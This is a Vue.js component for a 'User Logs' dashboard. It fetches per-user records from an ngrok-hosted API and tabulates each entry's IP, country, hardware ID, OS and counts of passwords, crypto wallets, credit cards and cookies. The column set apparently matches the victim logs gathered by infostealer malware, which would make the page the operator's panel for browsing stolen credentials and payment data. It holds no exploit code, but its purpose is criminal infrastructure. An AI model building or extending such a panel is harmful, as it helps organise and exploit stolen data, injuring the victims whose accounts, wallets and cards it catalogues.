<template>
  <div class="flex justify-between px-4 mt-4 sm:px-8">
    <h2 class="text-2xl text-gray-600">User Logs</h2>

    <div class="flex items-center space-x-1 text-xs">
      
      <p class="font-bold text-indigo-700">Hello {{ $route.params.userId }}</p>
      
      
    </div>
  </div>

  <div class="p-4 mt-8 sm:px-8 sm:py-4">
    <div class="p-4 bg-white rounded">
      <div class="flex justify-between">
        <div>
          <div class="relative text-gray-400">
            <span class="absolute inset-y-0 left-0 flex items-center pl-2">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                class="h-6 w-6"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2"
                  d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
                />
              </svg>
            </span>
            <input
              id="search"
              name="search"
              type="search"
              class="
                w-full
                py-2
                text-sm text-gray-900
                rounded-md
                pl-10
                border border-gray-300
                focus:outline-none focus:ring-gray-500 focus:ring-gray-500 focus:z-10
              "
              placeholder="Search logs"
            />
          </div>
        </div>
        <div>
          <div>
            
          </div>
        </div>
      </div>
      <template v-if="isLoading">
      <p>Loading...</p>
    </template>
    <template v-else-if="logs.length > 0">
      <table class="w-full mt-2 text-gray-500">
        <thead class="border-b">
          <tr>
            <th class="p-2 text-left text-gray-600">
              <input
                v-model="selectAll"
                type="checkbox"
                class="h-5 w-5 text-blue-500 border-gray-300 rounded cursor-pointer focus:ring-0"
              />
            </th>
            <th class="text-left text-gray-600">Username</th>
            <th class="text-left text-gray-600">IP</th>
            <th class="text-left text-gray-600">Country</th>
            
            <th class="text-left text-gray-600">Hwid</th>
            <th class="text-left text-gray-600">Os</th>
            <th class="text-left text-gray-600">Password Count</th>
            <th class="text-left text-gray-600">Wallet Count</th>
            <th class="text-left text-gray-600">CC Count</th>
            <th class="text-left text-gray-600">Cookie Count</th>
          </tr>
        </thead>
        <tbody class="divide-y divide-gray-200">
          <tr v-for="log in logs" :key="log.id">
            <td class="p-2">
              <input
                type="checkbox"
                class="h-5 w-5 text-blue-500 border-gray-300 rounded cursor-pointer focus:ring-0"
                :checked="selectAll"
              />
            </td>
            <td>
              {{ log.user }}
              
            </td>
            <td>{{ log.ip }}</td>
            <td>
             {{log.country}}
            </td>
            <td>{{ log.hwid }}</td>
            <td>{{ log.os  }}</td>
            <td > {{ log.password_count  }}</td>
            <td > {{ log.wallet_count  }}</td>
            <td > {{ log.cc_count  }}</td>
            <td > {{ log.cookie_count  }}</td>
          </tr>
        </tbody>
        <tfoot>
          <tr>
            <td colspan="7" class="py-2">
              <div class="hidden sm:flex-1 sm:flex sm:items-center sm:justify-between">
                <div>
                  <p class="text-sm text-gray-500">
                    Showing
                    <span class="font-medium">{{logs.length}}</span>
                    
                    of
                    <span class="font-medium">{{logs.length}}</span>
                    Entries
                  </p>
                </div>
                <div>
                  <nav class="relative z-0 inline-flex rounded-md shadow-sm -space-x-px" aria-label="Pagination">
                    <a
                      href="#"
                      class="
                        relative
                        inline-flex
                        items-center
                        px-2
                        rounded-l-md
                        border border-gray-300
                        text-sm
                        font-medium
                        text-gray-500
                        hover:bg-gray-50
                      "
                    >
                      <span class="sr-only">Previous</span>
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        class="h-6 w-6"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                      >
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                      </svg>
                    </a>
                    <!-- Current: "z-10 bg-indigo-50 border-indigo-500 text-indigo-600", Default: "bg-white border-gray-300 text-gray-500 hover:bg-gray-50" -->
                    <a
                      href="#"
                      aria-current="page"
                      class="
                        z-10
                        bg-indigo-50
                        border-indigo-500
                        text-indigo-600
                        relative
                        inline-flex
                        items-center
                        px-4
                        py-1
                        border
                        text-sm
                        font-medium
                      "
                    >
                      1
                    </a>
                    <a
                      href="#"
                      class="
                        border-gray-300
                        text-gray-500
                        hover:bg-gray-50
                        relative
                        inline-flex
                        items-center
                        px-4
                        py-1
                        border
                        text-sm
                        font-medium
                      "
                    >
                      2
                    </a>
                    <a
                      href="#"
                      class="
                        border-gray-300
                        text-gray-500
                        hover:bg-gray-50
                        hidden
                        md:inline-flex
                        relative
                        items-center
                        px-4
                        py-1
                        border
                        text-sm
                        font-medium
                      "
                    >
                      3
                    </a>
                    <span
                      class="
                        relative
                        inline-flex
                        items-center
                        px-4
                        py-1
                        border border-gray-300
                        text-sm
                        font-medium
                        text-gray-700
                      "
                    >
                      ...
                    </span>
                    <a
                      href="#"
                      class="
                        border-gray-300
                        text-gray-500
                        hover:bg-gray-50
                        hidden
                        md:inline-flex
                        relative
                        items-center
                        px-4
                        py-1
                        border
                        text-sm
                        font-medium
                      "
                    >
                      8
                    </a>
                    <a
                      href="#"
                      class="
                        border-gray-300
                        text-gray-500
                        hover:bg-gray-50
                        relative
                        inline-flex
                        items-center
                        px-4
                        py-1
                        border
                        text-sm
                        font-medium
                      "
                    >
                      9
                    </a>
                    <a
                      href="#"
                      class="
                        border-gray-300
                        text-gray-500
                        hover:bg-gray-50
                        relative
                        inline-flex
                        items-center
                        px-4
                        py-1
                        border
                        text-sm
                        font-medium
                      "
                    >
                      10
                    </a>
                    <a
                      href="#"
                      class="
                        relative
                        inline-flex
                        items-center
                        px-2
                        py-1
                        rounded-r-md
                        border border-gray-300
                        text-sm
                        font-medium
                        text-gray-500
                        hover:bg-gray-50
                      "
                    >
                      <span class="sr-only">Next</span>
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        class="h-6 w-6"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                      >
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                      </svg>
                    </a>
                  </nav>
                </div>
              </div>
            </td>
          </tr>
        </tfoot>
      </table>
      </template>
      <template v-else>
        <p>No logs found for this user.</p>
      </template>
    </div>
  </div>
</template>

<script>
import { reactive, ref, onMounted } from 'vue';
import { Menu, MenuButton, MenuItems, MenuItem } from '@headlessui/vue'
import { useRoute } from 'vue-router';
import axios from 'axios';

export default {
  name: 'UserLogs',

  components: {
    Menu,
    MenuButton,
    MenuItems,
    MenuItem,
  },

  setup() {
    const route = useRoute();
    const selectAll = ref(false)

    const username = route.params.userId
    
    const logs = reactive([]);
    const isLoading = ref(true);

    const fetchLogs = async () => {
      try {
        const response = await axios.get(`https://5c8c-105-113-8-23.ngrok-free.app/api/users/${route.params.userId}/logs`);
        logs.splice(0, logs.length, ...response.data.logs);
        console.log(logs)
        isLoading.value = false;
      } catch (error) {
        console.error(error);
      }
    };

    onMounted(() => {
      fetchLogs();
    });

    return {
      logs,
      isLoading,
      selectAll
    };
  }
};
</script>
